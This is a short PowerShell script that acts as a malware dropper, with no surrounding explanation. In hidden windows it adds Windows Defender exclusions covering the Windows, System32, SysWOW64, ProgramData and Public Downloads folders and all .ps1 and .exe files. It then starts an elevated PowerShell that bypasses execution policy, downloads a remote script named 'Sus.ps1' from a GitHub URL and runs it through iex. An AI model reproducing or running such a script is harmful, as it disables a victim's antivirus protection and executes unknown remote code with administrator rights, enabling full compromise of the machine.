powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.ps1'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"

Start-Sleep -Seconds 2

powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList 'irm "https://raw.githubusercontent.com/AmjadBalls/TEST/refs/heads/main/Sus.ps1" | iex' -Verb RunAs"
